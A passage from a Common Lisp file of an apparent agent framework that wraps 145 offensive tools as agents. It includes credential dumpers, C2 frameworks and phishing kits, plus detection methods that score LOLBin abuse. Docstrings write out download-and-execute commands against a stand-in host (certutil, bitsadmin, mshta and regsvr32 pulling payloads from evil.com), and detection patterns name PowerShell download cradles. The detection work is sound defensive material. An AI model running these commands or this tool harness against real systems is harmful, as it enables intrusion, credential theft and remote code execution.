                          :args '(\"-urlcache\" \"-split\" \"-f\" \"http://evil.com/payload\"))~%~%
                   The agent is NOT automatically started. Call run-tool~%
                   to execute the underlying binary."
                  agent-class
                  default-args
                  agent-class
                  constructor)
         (let ((instance (make-instance ',agent-class
                         :binary ,binary-sym
                         :args args
                         :tool-category ,category-sym
                         :target target)))
           ;; Register in the offensive tool registry
           (bt:with-lock-held (*offensive-tool-registry-lock*)
             (setf (gethash ',name *offensive-tool-registry*)
                   (list :class-name ',agent-class
                         :binary-path ,binary-sym
                         :category ,category-sym
                         :default-args args
                         :requires-root ,root-p
                         :output-format ,format-sym
                         :parsers ',parser-list
                         :description ,desc
                         :loaded-p t)))
           ;; Gossip: announce tool spawn
           (publish-message :swarm.kali.status
                            `(:event :tool-spawned
                              :tool ',name
                              :agent-id (agent-id instance)
                              :category ,category-sym
                              :timestamp (local-time:now)))
           ;; Register in the Kali agent registry too
           (register-kali-agent instance)
           instance))

       ;; ── 7. finalize-agent :after — process cleanup ────────────────
       (defmethod finalize-agent :after ((agent ,agent-class))
         ,(format nil "Clean up any remaining process state for ~A.~%~%
                   This :after method ensures that when a ~A is~%
                   garbage-collected or explicitly finalized, any~%
                   dangling process handles are closed and the agent~%
                   is deregistered from all registries."
                  agent-class agent-class)
         (ignore-errors
           (when (agent-process agent)
             (uiop:terminate-process (agent-process agent) :urgent t)
             (setf (agent-process agent) nil)))
         (ignore-errors
           (when (agent-output-stream agent)
             (close (agent-output-stream agent))
             (setf (agent-output-stream agent) nil)))
         ;; Deregister from the offensive tool registry
         (bt:with-lock-held (*offensive-tool-registry-lock*)
           (let ((entry (gethash ',name *offensive-tool-registry*)))
             (when entry
               (setf (getf entry :loaded-p) nil))))
         (log-message :info "[OFFENSIVE-TOOL] Finalized ~A agent ~A"
                      ',name (agent-id agent)))

       ;; ── 8. Record macro expansion for introspection ────────────────
       (log-message :debug "[OFFENSIVE-TOOL] Defined ~A (~A) → ~A"
                    ',name ',category-sym ',agent-class)

       ;; Return the class symbol for convenience
       ',agent-class)))

;; ─────────────────────────────────────────────────────────────────────────
;; Section C: The *offensive-tool-manifest* — 100+ Tool Definitions
;; ─────────────────────────────────────────────────────────────────────────

(defparameter *offensive-tool-manifest*
  '(
    ;; ═══ LOLBINS (Living-Off-The-Land Binaries) ═══
    ;; These binaries exist on every Windows system. Attackers abuse them
    ;; to download payloads, execute scripts, bypass AppLocker, escalate
    ;; privileges, and persist — all without dropping custom tools.
    ;; Source: LOLBAS (Living Off The Land Binaries and Scripts) project,
    ;;         MITRE ATT&CK techniques T1218, T1216, T1059.

    (certutil          :lolbin        "/usr/bin/certutil"        (-urlcache -split -f))
    (bitsadmin         :lolbin        "/usr/bin/bitsadmin"       (transfer))
    (mshta             :lolbin        "/usr/bin/mshta"           ())
    (rundll32          :lolbin        "/usr/bin/rundll32"        ())
    (regsvr32          :lolbin        "/usr/bin/regsvr32"        (-u -s))
    (wmic              :lolbin        "/usr/bin/wmic"            ())
    (cscript           :lolbin        "/usr/bin/cscript"         ())
    (powershell        :lolbin        "/usr/bin/powershell"      (-ep bypass))
    (installutil       :lolbin        "/usr/bin/installutil"     (/logfile=))
    (msbuild           :lolbin        "/usr/bin/msbuild"         ())
    (regsvcs           :lolbin        "/usr/bin/regsvcs"         ())
    (regasm            :lolbin        "/usr/bin/regasm"          ())
    (control           :lolbin        "/usr/bin/control"         ())
    (infdefaultinstall :lolbin        "/usr/bin/InfDefaultInstall" ())
    (esentutl          :lolbin        "/usr/bin/esentutl"        ())
    (expand            :lolbin        "/usr/bin/expand"          ())
    (makecab           :lolbin        "/usr/bin/makecab"         ())
    (replace           :lolbin        "/usr/bin/replace"         ())
    (syncappvpublish   :lolbin        "/usr/bin/SyncAppvPublishingServer" ())
    (odbcconf          :lolbin        "/usr/bin/odbcconf"        ())
    (diskshadow        :lolbin        "/usr/bin/diskshadow"      ())
    (forfiles          :lolbin        "/usr/bin/forfiles"        (/c))
    (sc                :lolbin        "/usr/bin/sc"              ())
    (schtasks          :lolbin        "/usr/bin/schtasks"        (/create))
    (at                :lolbin        "/usr/bin/at"              ())
    (winrm             :lolbin        "/usr/bin/winrm"           ())
    (wsl               :lolbin        "/usr/bin/wsl"             ())
    (certreq           :lolbin        "/usr/bin/certreq"         (-post))
    (desktopimgdownldr :lolbin        "/usr/bin/DesktopImgDownldr" ())
    (eventvwr          :lolbin        "/usr/bin/eventvwr"        ())
    (fodhelper         :lolbin        "/usr/bin/fodhelper"       ())
    (computerdefaults  :lolbin        "/usr/bin/computerdefaults" ())
    (slui              :lolbin        "/usr/bin/slui"            ())
    (dfsvc             :lolbin        "/usr/bin/dfsvc"           ())
    (tracker           :lolbin        "/usr/bin/tracker"         (/d /c))
    (update            :lolbin        "/usr/bin/update"          ())
    (pcalua            :lolbin        "/usr/bin/pcalua"          (-a))

    ;; ═══ CREDENTIAL DUMPING ═══
    ;; Tools for extracting credentials from memory, SAM, LSASS, NTDS.dit,
    ;; and cached authentication data. These represent the crown jewels of
    ;; post-exploitation — once credentials are obtained, lateral movement
    ;; and privilege escalation become trivial.
    ;; Source: MITRE ATT&CK T1003 (OS Credential Dumping)

    (mimikatz          :creds         "/opt/mimikatz/x64/mimikatz.exe" ())
    (rubeus            :creds         "/opt/rubeus/rubeus.exe"   ())
    (impacket-secretsdump :creds      "/usr/bin/secretsdump.py"  ())
    (impacket-samrdump :creds         "/usr/bin/samrdump.py"     ())
    (netexec           :creds         "/usr/bin/netexec"         ())
    (crackmapexec      :creds         "/usr/bin/crackmapexec"    ())
    (fgdump            :creds         "/usr/bin/fgdump"          ())
    (lsasecrets        :creds         "/usr/bin/lsasecrets"      ())
    (gsecdump          :creds         "/usr/bin/gsecdump"        ())
    (pwdump            :creds         "/usr/bin/pwdump"          ())
    (cachedump         :creds         "/usr/bin/cachedump"       ())
    (tater             :creds         "/usr/bin/tater"           ())
    (inveigh           :creds         "/usr/bin/inveigh"         ())
    (mimipenguin       :creds         "/usr/bin/mimipenguin"     ())
    (lazagne           :creds         "/usr/bin/laZagne"         ())
    (pypykatz          :creds         "/usr/bin/pypykatz"        ())

    ;; ═══ LATERAL MOVEMENT ═══
    ;; Tools for moving between systems in a compromised network. These
    ;; leverage valid credentials, protocol implementations, or tunneling
    ;; techniques to access new hosts without exploiting new vulnerabilities.
    ;; Source: MITRE ATT&CK T1021 (Remote Services)

    (impacket-psexec   :lateral       "/usr/bin/psexec.py"       ())
    (impacket-wmiexec  :lateral       "/usr/bin/wmiexec.py"      ())
    (impacket-smbexec  :lateral       "/usr/bin/smbexec.py"      ())
    (impacket-atexec   :lateral       "/usr/bin/atexec.py"       ())
    (impacket-dcomexec :lateral       "/usr/bin/dcomexec.py"     ())
    (impacket-mqttexec :lateral       "/usr/bin/mqtt_check.py"   ())
    (evil-winrm        :lateral       "/usr/bin/evil-winrm"      ())
    (bloodhound-python :lateral       "/usr/bin/bloodhound-python" ())
    (sharphound        :lateral       "/usr/bin/sharphound"      ())
    (ladon             :lateral       "/usr/bin/ladon"           ())
    (pth-toolkit       :lateral       "/usr/bin/pth-toolkit"     ())
    (rdp-tunnel        :lateral       "/usr/bin/rdp-tunnel"      ())
    (chisel            :lateral       "/usr/bin/chisel"          ())
    (ligolo-ng         :lateral       "/usr/bin/ligolo-ng"       ())
    (ssf               :lateral       "/usr/bin/ssf"             ())
    (dnscat2           :lateral       "/usr/bin/dnscat2"         ())
    (iodine            :lateral       "/usr/bin/iodine"          ())
    (ptunnel           :lateral       "/usr/bin/ptunnel"         ())
    (stowaway          :lateral       "/usr/bin/stowaway"        ())

    ;; ═══ POST-EXPLOITATION / C2 ═══
    ;; Command-and-control frameworks and post-exploitation toolkits. Once
    ;; initial access is achieved, these provide persistent control, payload
    ;; delivery, module execution, and data exfiltration capabilities.
    ;; Source: MITRE ATT&CK TA0011 (Command and Control)

    (metasploit        :post-exploit  "/usr/bin/msfconsole"      ())
    (empire            :post-exploit  "/usr/bin/powershell-empire" ())
    (covenant          :post-exploit  "/opt/covenant/covenant"   ())
    (poshc2            :post-exploit  "/opt/poshc2/poshc2"       ())
    (sliver            :post-exploit  "/usr/bin/sliver-client"   ())
    (havoc             :post-exploit  "/opt/havoc/havoc"         ())
    (bruteratel        :post-exploit  "/opt/bruteratel/brute"    ())
    (shad0w            :post-exploit  "/opt/shad0w/shad0w"       ())
    (mythic            :post-exploit  "/opt/mythic/mythic-cli"   ())
    (trevorc2          :post-exploit  "/opt/trevorc2/trevorc2"   ())
    (silenttrinity     :post-exploit  "/usr/bin/st"              ())
    (macro-pack        :post-exploit  "/usr/bin/macro_pack"      ())
    (unicorn           :post-exploit  "/usr/bin/unicorn"         ())
    (greatserpent      :post-exploit  "/usr/bin/greatserpent"    ())
    (nimplant          :post-exploit  "/usr/bin/nimplant"        ())

    ;; ═══ WEB ═══
    ;; Tools for web application security testing: SQL injection, XSS,
    ;; directory enumeration, CMS exploitation, CORS misconfiguration,
    ;; and API testing.
    ;; Source: OWASP Testing Guide v4.2

    (sqlmap            :web           "/usr/bin/sqlmap"          ())
    (burpsuite         :web           "/usr/bin/burpsuite"       ())
    (nikto             :web           "/usr/bin/nikto"           ())
    (dirb              :web           "/usr/bin/dirb"            ())
    (gobuster          :web           "/usr/bin/gobuster"        ())
    (wfuzz             :web           "/usr/bin/wfuzz"           ())
    (commix            :web           "/usr/bin/commix"          ())
    (whatweb           :web           "/usr/bin/whatweb"         ())
    (zaproxy           :web           "/usr/bin/zaproxy"         ())
    (xsstrike          :web           "/usr/bin/xsstrike"        ())
    (tplmap            :web           "/usr/bin/tplmap"          ())
    (xsser             :web           "/usr/bin/xsser"           ())
    (domlink           :web           "/usr/bin/domlink"         ())
    (photon            :web           "/usr/bin/photon"          ())
    (arjun             :web           "/usr/bin/arjun"           ())
    (corscanner        :web           "/usr/bin/corscanner"      ())
    (gitgraber         :web           "/usr/bin/gitgraber"       ())
    (gitrob            :web           "/usr/bin/gitrob"          ())
    (gittools          :web           "/usr/bin/gittools"        ())

    ;; ═══ RECON / OSINT ═══
    ;; Reconnaissance and open-source intelligence tools for gathering
    ;; information about targets: subdomain enumeration, cloud asset
    ;; discovery, social media analysis, and email/username enumeration.
    ;; Source: MITRE ATT&CK TA0043 (Reconnaissance)

    (maltego           :recon         "/usr/bin/maltego"         ())
    (recon-ng          :recon         "/usr/bin/recon-ng"        ())
    (osmedeus          :recon         "/usr/bin/osmedeus"        ())
    (finalrecon        :recon         "/usr/bin/finalrecon"      ())
    (cloudbrute        :recon         "/usr/bin/cloudbrute"      ())
    (s3scanner         :recon         "/usr/bin/s3scanner"       ())
    (cloud-enum        :recon         "/usr/bin/cloud_enum"      ())
    (sherlock          :recon         "/usr/bin/sherlock"        ())
    (twint             :recon         "/usr/bin/twint"           ())
    (holehe            :recon         "/usr/bin/holehe"          ())
    (ignorant          :recon         "/usr/bin/ignorant"        ())
    (toutatis          :recon         "/usr/bin/toutatis"        ())
    (nexfil            :recon         "/usr/bin/nexfil"          ())
    (murder            :recon         "/usr/bin/murder"          ())
    (muraena           :recon         "/usr/bin/muraena"         ())
    (modlishka         :recon         "/usr/bin/modlishka"       ())

    ;; ═══ SOCIAL ENGINEERING ═══
    ;; Tools for phishing, credential harvesting, and social engineering
    ;; campaigns. These automate the creation of fake login pages, email
    ;; campaigns, and browser exploitation frameworks.
    ;; Source: MITRE ATT&CK T1566 (Phishing)

    (setoolkit         :social-engineering "/usr/bin/setoolkit"    ())
    (king-phisher      :social-engineering "/usr/bin/king-phisher" ())
    (gophish           :social-engineering "/usr/bin/gophish"      ())
    (beef-xss          :social-engineering "/usr/bin/beef-xss"     ())
    (evilginx2         :social-engineering "/usr/bin/evilginx2"    ())
    (cred-sniper       :social-engineering "/usr/bin/cred-sniper"  ())
    (socialfish        :social-engineering "/usr/bin/socialfish"   ())
    (blackeye          :social-engineering "/usr/bin/blackeye"     ())
    (shellphish        :social-engineering "/usr/bin/shellphish"   ())
    (zphisher          :social-engineering "/usr/bin/zphisher"     ())
    (catphish          :social-engineering "/usr/bin/catphish"     ())
    (ghost-phisher     :social-engineering "/usr/bin/ghost-phisher" ())
    (weeman            :social-engineering "/usr/bin/weeman"       ())

    ;; ═══ WIRELESS (additional beyond existing kali-interface tools) ═══
    ;; Additional wireless security tools for WPS attacks, evil twin
    ;; deployment, 802.1X bypass, and WPA-Enterprise exploitation.
    ;; These complement the existing aircrack-ng, bettercap, airgeddon
    ;; and air-monitor agents defined earlier in this file.

    (reaver            :wireless      "/usr/bin/reaver"          ())
    (pixiewps          :wireless      "/usr/bin/pixiewps"        ())
    (wifite            :wireless      "/usr/bin/wifite"          ())
    (fluxion           :wireless      "/usr/bin/fluxion"         ())
    (eaphammer         :wireless      "/usr/bin/eaphammer"       ())
    (wifipumpkin3      :wireless      "/usr/bin/wifipumpkin3"    ())
    (hostapd-wpe       :wireless      "/usr/bin/hostapd-wpe"     ())
    (asleap            :wireless      "/usr/bin/asleap"          ())
    (coercer           :wireless      "/usr/bin/coercer"         ())
    )
  "The master catalog of all offensive tools known to LISPMIND.

This manifest is a list of tool entry tuples, each of the form:
  (TOOL-NAME CATEGORY BINARY-PATH DEFAULT-ARGS)

Where:
  TOOL-NAME    — Symbol naming the tool (e.g., 'certutil, 'mimikatz)
  CATEGORY     — Keyword classifying the tool domain
  BINARY-PATH  — String, absolute filesystem path to the binary
  DEFAULT-ARGS — List of default command-line argument strings

The manifest is consumed by LOAD-TOOL-SUITE, which iterates over entries
and invokes DEFINE-OFFENSIVE-TOOL for each tool matching the requested
categories. This decouples tool definition (the manifest) from tool
instantiation (the factory).

CATEGORY SUMMARY:
  :lolbin               — 36 Living-Off-The-Land binaries (Windows LOLBAS)
  :creds                — 16 credential dumping/extraction tools
  :lateral              — 20 lateral movement/pivoting tools
  :post-exploit         — 16 C2 frameworks and post-exploitation tools
  :web                  — 19 web application security testing tools
  :recon                — 16 reconnaissance and OSINT tools
  :social-engineering   — 13 social engineering and phishing tools
  :wireless             — 9 additional wireless security tools
  ───────────────────────────────────────────────
  TOTAL                 — 145 tools

Usage:
  ;; Load all LOLBins and credential tools
  (load-tool-suite :categories '(:lolbin :creds))

  ;; Load everything
  (load-all-offensive-tools)

  ;; List what's loaded
  (list-loaded-tools)

See also: define-offensive-tool, load-tool-suite, list-tools-by-category.")

;; ─────────────────────────────────────────────────────────────────────────
;; Section D: The load-tool-suite Factory
;; ─────────────────────────────────────────────────────────────────────────

(defun load-tool-suite (&key (categories :all))
  "Generate agent classes from the manifest for given categories.

This is the factory function that transforms manifest entries into
live agent classes. It iterates over *offensive-tool-manifest*, filters
by category, and invokes DEFINE-OFFENSIVE-TOOL for each matching entry.

Parameters:
  :CATEGORIES — Either :all (load everything) or a list of category
                keywords like '(:lolbin :creds :lateral).
                Default: :all

Returns: A plist of (:loaded N :skipped M :errors E) summarizing
  the factory run.

Side effects:
  • Defines new classes via DEFINE-OFFENSIVE-TOOL macro expansion
  • Registers each tool in *offensive-tool-registry*
  • Updates *loaded-tool-categories* with newly loaded categories
  • Publishes :swarm.kali.status events for bulk load start/finish

Thread-safety: Acquires *offensive-tool-registry-lock* during the
  entire load operation to prevent concurrent modifications.

Example:
  ;; Load only LOLBins for a Windows engagement
  (load-tool-suite :categories '(:lolbin))

  ;; Load credential and lateral movement tools for AD assessment
  (load-tool-suite :categories '(:creds :lateral))

  ;; Load everything — the nuclear option
  (load-tool-suite :categories :all)

Performance: Loading all 145 tools typically takes <1 second on modern
  hardware. Each macro expansion is lightweight — the heavy lifting
  (class compilation) happens lazily at first instantiation.

See also: *offensive-tool-manifest*, load-all-offensive-tools."
  (let ((loaded 0)
        (skipped 0)
        (errors 0)
        (loaded-cats '()))
    (publish-message :swarm.kali.status
                     `(:event :bulk-load-start
                       :categories ,categories
                       :timestamp ,(local-time:now)))
    (bt:with-lock-held (*offensive-tool-registry-lock*)
      (dolist (entry *offensive-tool-manifest*)
        (destructuring-bind (name category binary-path default-args)
            entry
          ;; Check if this category should be loaded
          (when (or (eq categories :all)
                    (member category categories :test 'eq))
            ;; Check if already loaded
            (if (and (gethash name *offensive-tool-registry*)
                     (getf (gethash name *offensive-tool-registry*) :loaded-p))
                (progn
                  (incf skipped)
                  (log-message :debug "[LOAD-SUITE] Skipping ~A (already loaded)"
                               name))
                (handler-case
                    (progn
                      ;; Expand the macro to define the tool
                      (eval `(define-offensive-tool ,name
                               :binary-path ,binary-path
                               :category ,category
                               :default-args ',default-args
                               :requires-root nil
                               :output-format :text
                               :description
                               ,(format nil "~A tool: ~A"
                                        (string-capitalize (symbol-name category))
                                        (symbol-name name))))
                      (incf loaded)
                      (pushnew category loaded-cats :test 'eq)
                      (log-message :info "[LOAD-SUITE] Loaded ~A (~A)"
                                   name category))
                  (error (e)
                    (incf errors)
                    (warn "[LOAD-SUITE] Failed to load ~A: ~A" name e))))))))
    ;; Update loaded categories list
    (setf *loaded-tool-categories*
          (union *loaded-tool-categories* loaded-cats :test 'eq))
    ;; Publish completion event
    (publish-message :swarm.kali.status
                     `(:event :bulk-load-complete
                       :loaded ,loaded
                       :skipped ,skipped
                       :errors ,errors
                       :categories ,loaded-cats
                       :timestamp ,(local-time:now)))
    (log-message :info "[LOAD-SUITE] Factory complete: ~A loaded, ~A skipped, ~A errors"
                 loaded skipped errors)
    `(:loaded ,loaded :skipped ,skipped :errors ,errors)))

(defun load-all-offensive-tools ()
  "Convenience function: load all tools from the manifest.

Equivalent to (load-tool-suite :categories :all) but with a
convenient name and additional logging.

Returns: The result plist from load-tool-suite.

Example:
  (load-all-offensive-tools)
    => (:loaded 145 :skipped 0 :errors 0)

See also: load-tool-suite, list-loaded-tools."
  (log-message :info "[LOAD-ALL] Initiating full offensive tool load (~A tools in manifest)"
               (length *offensive-tool-manifest*))
  (let ((result (load-tool-suite :categories :all)))
    (log-message :info "[LOAD-ALL] Full load complete: ~A tools active"
                 (getf result :loaded))
    result))

(defun list-loaded-tools ()
  "List all currently loaded offensive tools.

Returns: An alist of (tool-name . properties) for each loaded tool,
  where properties is a plist containing :class-name, :category,
  :binary-path, and :loaded-p.

The list is sorted by category, then by tool name.

Example:
  (list-loaded-tools)
    => ((certutil :class-name certutil-agent :category :lolbin ...)
        (bitsadmin :class-name bitsadmin-agent :category :lolbin ...)
        ...)

See also: list-tools-by-category, load-tool-suite."
  (bt:with-lock-held (*offensive-tool-registry-lock*)
    (let ((tools '()))
      (maphash (lambda (name props)
                 (when (getf props :loaded-p)
                   (push (cons name props) tools)))
               *offensive-tool-registry*)
      ;; Sort by category, then by name
      (sort tools (lambda (a b)
                    (let ((cat-a (getf (cdr a) :category))
                          (cat-b (getf (cdr b) :category)))
                      (if (eq cat-a cat-b)
                          (string< (symbol-name (car a))
                                   (symbol-name (car b)))
                          (string< (symbol-name cat-a)
                                   (symbol-name cat-b)))))))))

(defun list-tools-by-category (category)
  "List tools filtered by category.

Parameters:
  CATEGORY — A keyword like :lolbin, :creds, :lateral, etc.

Returns: An alist of (tool-name . properties) for tools in the
  specified category, sorted by tool name.

Example:
  (list-tools-by-category :lolbin)
    => ((certutil ...) (bitsadmin ...) (mshta ...) ...)

See also: list-loaded-tools, load-tool-suite."
  (bt:with-lock-held (*offensive-tool-registry-lock*)
    (let ((tools '()))
      (maphash (lambda (name props)
                 (when (and (eq (getf props :category) category)
                            (getf props :loaded-p))
                   (push (cons name props) tools)))
               *offensive-tool-registry*)
      (sort tools #'string< :key (lambda (x) (symbol-name (car x)))))))

(defun get-tool-count-by-category ()
  "Return a count of loaded tools per category.

Returns: An alist of (category . count), sorted by category name.

Example:
  (get-tool-count-by-category)
    => ((:creds . 16) (:lateral . 20) (:lolbin . 36) ...)

See also: list-loaded-tools, list-tools-by-category."
  (bt:with-lock-held (*offensive-tool-registry-lock*)
    (let ((counts (make-hash-table :test 'eq)))
      (maphash (lambda (name props)
                 (declare (ignore name))
                 (when (getf props :loaded-p)
                   (let ((cat (getf props :category)))
                     (incf (gethash cat counts 0)))))
               *offensive-tool-registry*)
      (let ((result '()))
        (maphash (lambda (cat count)
                   (push (cons cat count) result))
                 counts)
        (sort result #'string< :key (lambda (x) (symbol-name (car x))))))))

;; ─────────────────────────────────────────────────────────────────────────
;; Section E: LOLBin-Specific Suspicious Activity Detection
;; ─────────────────────────────────────────────────────────────────────────

(defgeneric detect-lolbin-suspicious-activity (agent line)
  (:documentation
   "Analyze a command line or output line for suspicious LOLBin usage.

This generic function dispatches on the LOLBin agent type to apply
tool-specific detection logic. Each LOLBin has known adversarial
abuse patterns (documented in *lolbin-suspicious-patterns*) that
this function checks against.

Parameters:
  AGENT — A LOLBin agent instance (subclass of kali-agent).
  LINE  — A string, either a command line or output line to analyze.

Returns: A suspicion score (integer 0-100) and a list of matched
  pattern descriptions. Higher scores indicate more suspicious usage.
  Format: (score . (pattern1 pattern2 ...))

The score thresholds:
  0-20   — Likely benign administrative usage
  21-50  — Potentially suspicious, worth monitoring
  51-80  — Probably malicious, alert the analyst
  81-100 — Highly likely malicious, immediate escalation

See also: *lolbin-suspicious-patterns*, score-lolbin-command."))

(defgeneric score-lolbin-command (agent command-line)
  (:documentation
   "Score a full command line for LOLBin abuse indicators.

Returns: An integer score from 0 (benign) to 100 (definitely malicious).

This function performs deep analysis of the command-line arguments,
checking for known attack patterns, suspicious URL schemes, encoded
payloads, and unusual argument combinations.

See also: detect-lolbin-suspicious-activity."))

;; ── Certutil detection ────────────────────────────────────────────────────

(defmethod detect-lolbin-suspicious-activity ((agent certutil-agent) line)
  "Detect if certutil is being used for malicious download or encoding.

Certutil abuse patterns (MITRE ATT&CK T1105, T1027):
  • certutil -urlcache -split -f http://evil.com/payload.exe
    — Downloads a file using the certificate cache as cover
  • certutil -encode payload.exe payload.b64
    — Base64 encodes a payload for obfuscation
  • certutil -decode payload.b64 payload.exe
    — Decodes a payload after exfiltration
  • certutil -urlcache http://... (without -split)
    — Less common variant still seen in the wild

Detection logic:
  1. Check for -urlcache + HTTP/HTTPS/FTP URL patterns
  2. Check for -encode/-decode (payload transformation)
  3. Check for -split -f combination (forced download)
  4. Score each pattern match and aggregate.

Returns: (score . matched-patterns) plist."
  (let ((score 0)
        (patterns '()))
    ;; Pattern 1: URL download via -urlcache
    (when (and (search "-urlcache" line)
               (or (search "http://" line)
                   (search "https://" line)
                   (search "ftp://" line)))
      (incf score 40)
      (push "certutil -urlcache with remote URL (T1105)" patterns))
    ;; Pattern 2: File encoding/decoding
    (when (or (search "-encode" line) (search "-decode" line))
      (incf score 30)
      (push "certutil payload encoding/decoding (T1027)" patterns))
    ;; Pattern 3: Force download flag combination
    (when (and (search "-split" line) (search "-f" line))
      (incf score 25)
      (push "certutil -split -f forced download" patterns))
    ;; Pattern 4: Suspicious file extensions in URL
    (when (and (search "http" line)
               (or (search ".exe" line) (search ".dll" line)
                   (search ".bat" line) (search ".ps1" line)))
      (incf score 20)
      (push "certutil downloading executable content" patterns))
    (cons score (nreverse patterns))))

(defmethod score-lolbin-command ((agent certutil-agent) command-line)
  "Score a certutil command line for abuse indicators."
  (car (detect-lolbin-suspicious-activity agent command-line)))

;; ── Bitsadmin detection ───────────────────────────────────────────────────

(defmethod detect-lolbin-suspicious-activity ((agent bitsadmin-agent) line)
  "Detect if bitsadmin is being used for unauthorized file transfer.

Bitsadmin abuse patterns (MITRE ATT&CK T1105):
  • bitsadmin /transfer myjob http://evil.com/payload.exe C:\\tmp\\p.exe
    — Creates a named transfer job to download a payload
  • bitsadmin /create myjob + bitsadmin /addfile ...
    — Multi-step job creation for persistence
  • bitsadmin /setnotifycmdline myjob cmd.exe '/c ...'
    — Executes a command when the transfer completes
  • bitsadmin /SetCustomHeader myjob 'Cookie: ...'
    — Adds custom headers for C2 communication

Detection logic:
  1. Check for /transfer or /addfile with remote URLs
  2. Check for /setnotifycmdline (post-transfer execution)
  3. Check for executable file destinations
  4. Score each pattern and aggregate."
  (let ((score 0)
        (patterns '()))
    ;; Pattern 1: Transfer with remote URL
    (when (and (or (search "transfer" line) (search "/transfer" line)
                   (search "addfile" line) (search "/addfile" line))
               (or (search "http://" line) (search "https://" line)
                   (search "ftp://" line)))
      (incf score 45)
      (push "bitsadmin transfer from remote URL (T1105)" patterns))
    ;; Pattern 2: Command execution after transfer
    (when (search "setnotifycmdline" line)
      (incf score 50)
      (push "bitsadmin post-transfer command execution" patterns))
    ;; Pattern 3: Job creation followed by file addition
    (when (and (search "create" line) (search "addfile" line))
      (incf score 20)
      (push "bitsadmin multi-step job creation" patterns))
    ;; Pattern 4: Executable destination
    (when (and (search "http" line)
               (or (search ".exe" line) (search ".dll" line)
                   (search ".bat" line)))
      (incf score 25)
      (push "bitsadmin downloading executable content" patterns))
    (cons score (nreverse patterns))))

(defmethod score-lolbin-command ((agent bitsadmin-agent) command-line)
  "Score a bitsadmin command line for abuse indicators."
  (car (detect-lolbin-suspicious-activity agent command-line)))

;; ── Mshta detection ──────────────────────────────────────────────────────

(defmethod detect-lolbin-suspicious-activity ((agent mshta-agent) line)
  "Detect if mshta is being used to execute malicious scripts.

Mshta abuse patterns (MITRE ATT&CK T1218.005):
  • mshta javascript:alert('evil')
    — Executes JavaScript directly from command line
  • mshta vbscript:Execute('...')
    — Executes VBScript directly
  • mshta http://evil.com/payload.hta
    — Downloads and executes an HTA from a remote server
  • mshta about:<script>...
    — Executes script without touching disk

Detection logic:
  1. Check for inline JavaScript or VBScript
  2. Check for remote HTA file references
  3. Check for the 'about:' scheme (fileless execution)
  4. Score each pattern and aggregate."
  (let ((score 0)
        (patterns '()))
    ;; Pattern 1: Inline script execution
    (when (or (search "javascript:" line) (search "javascript" line)
              (search "vbscript:" line) (search "vbscript" line)
              (search "jscript:" line))
      (incf score 50)
      (push "mshta inline script execution (T1218.005)" patterns))
    ;; Pattern 2: Remote HTA
    (when (and (or (search "http://" line) (search "https://" line))
               (search ".hta" line))
      (incf score 45)
      (push "mshta remote HTA execution" patterns))
    ;; Pattern 3: Fileless about: execution
    (when (search "about:" line)
      (incf score 40)
      (push "mshta fileless about: execution" patterns))
    ;; Pattern 4: Execute directive
    (when (search "execute" line)
      (incf score 20)
      (push "mshta with execute directive" patterns))
    (cons score (nreverse patterns))))

(defmethod score-lolbin-command ((agent mshta-agent) command-line)
  "Score an mshta command line for abuse indicators."
  (car (detect-lolbin-suspicious-activity agent command-line)))

;; ── Powershell detection ─────────────────────────────────────────────────

(defmethod detect-lolbin-suspicious-activity ((agent powershell-agent) line)
  "Detect if PowerShell is being used for malicious execution.

PowerShell abuse patterns (MITRE ATT&CK T1059.001):
  • powershell -enc <base64>
    — Encoded command execution (obfuscation)
  • powershell -ep bypass
    — Bypasses execution policy
  • powershell IEX (Invoke-Expression)
    — Executes a string as code
  • powershell -w hidden
    — Hides the window
  • powershell DownloadString / DownloadFile
    — Downloads content from remote server
  • powershell FromBase64String
    — Decodes base64 payloads

Detection logic:
  1. Check for encoded commands (-enc, -encodedcommand)
  2. Check for execution policy bypass
  3. Check for download primitives
  4. Check for obfuscation patterns
  5. Score each pattern and aggregate."
  (let ((score 0)
        (patterns '()))
    ;; Pattern 1: Encoded command (strong indicator)
    (when (or (search "-enc" line) (search "-encodedcommand" line)
              (search "-encoded" line))
      (incf score 50)
      (push "powershell encoded command (T1059.001)" patterns))
    ;; Pattern 2: Execution policy bypass
    (when (or (search "-ep bypass" line) (search "executionpolicy bypass" line)
              (search "-ep unrestricted" line))
      (incf score 35)
      (push "powershell execution policy bypass" patterns))
    ;; Pattern 3: Window hidden
    (when (or (search "-w hidden" line) (search "-windowstyle hidden" line))
      (incf score 30)
      (push "powershell hidden window" patterns))
    ;; Pattern 4: Download primitives
    (when (or (search "downloadstring" line) (search "downloadfile" line)
              (search "invoke-webrequest" line) (search "iwr" line))
      (incf score 40)
      (push "powershell remote download primitive" patterns))
    ;; Pattern 5: Invoke-Expression (code execution from string)
    (when (or (search "invoke-expression" line) (search "iex" line))
      (incf score 35)
      (push "powershell invoke-expression code execution" patterns))
    ;; Pattern 6: Base64 decoding
    (when (or (search "frombase64string" line) (search "[convert]::" line))
      (incf score 30)
      (push "powershell base64 decoding" patterns))
    ;; Pattern 7: Net.WebClient (common download cradle)
    (when (search "net.webclient" line)
      (incf score 25)
      (push "powershell net.webclient usage" patterns))
    (cons score (nreverse patterns))))

(defmethod score-lolbin-command ((agent powershell-agent) command-line)
  "Score a PowerShell command line for abuse indicators."
  (car (detect-lolbin-suspicious-activity agent command-line)))

;; ── Regsvr32 detection ───────────────────────────────────────────────────

(defmethod detect-lolbin-suspicious-activity ((agent regsvr32-agent) line)
  "Detect if regsvr32 is being used for malicious script execution.

Regsvr32 abuse patterns (MITRE ATT&CK T1218.010):
  • regsvr32 /u /s /i:http://evil.com/payload.sct scrobj.dll
    — Executes a remote scriptlet via COM scriptlet host
  • regsvr32 /i:http://... dllname
    — Passes a URL to the DLLInstall entry point
  • regsvr32 scrobj.dll
    — Loads the scriptlet object (often paired with /i)

Detection logic:
  1. Check for /i with remote URL
  2. Check for scrobj.dll (scriptlet host)
  3. Check for /u (unregister) with network indicator
  4. Score each pattern and aggregate."
  (let ((score 0)
        (patterns '()))
    ;; Pattern 1: /i with remote URL (Squiblydoo technique)
    (when (and (or (search "/i:" line) (search "/i" line))
               (or (search "http://" line) (search "https://" line)))
      (incf score 50)
      (push "regsvr32 /i with remote URL (Squiblydoo, T1218.010)" patterns))
    ;; Pattern 2: scrobj.dll (scriptlet object)
    (when (search "scrobj" line)
      (incf score 40)
      (push "regsvr32 loading scrobj.dll (scriptlet host)" patterns))
    ;; Pattern 3: Silent mode with network
    (when (and (search "/s" line)
               (or (search "http" line) (search "\\" line)))
      (incf score 30)
      (push "regsvr32 silent mode with network path" patterns))
